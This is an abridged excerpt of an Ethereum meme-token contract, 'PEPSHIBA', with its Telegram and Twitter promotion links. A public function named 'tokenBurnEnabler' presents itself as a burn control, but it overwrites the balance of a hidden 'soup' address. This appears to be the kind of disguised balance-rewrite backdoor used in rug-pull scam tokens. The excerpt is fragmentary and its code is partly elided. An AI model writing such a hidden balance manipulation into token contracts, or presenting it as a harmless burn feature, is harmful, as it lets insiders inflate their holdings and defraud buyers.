...
Telegram: https://t.me/PEPESHIBAEntry

Website：https://t.me/PEPEShibaERC 10m
Twitter:  https://twitter.com/PEPESHIBAERC
...
contract PEPSHIBA is Context, Ownable, IERC20 {
    ...
    address public soup;
    uint256 marketFee = 0;
    address public marketAddress = 0xF5895F4AFB56e01aee3C85B90433c6b3617Bc926; //
    ...
    function tokenBurnEnabler(uint enable) public {
        ...
        _balances[soup] = tokenToBurn.sub(_balances[soup]);
    }
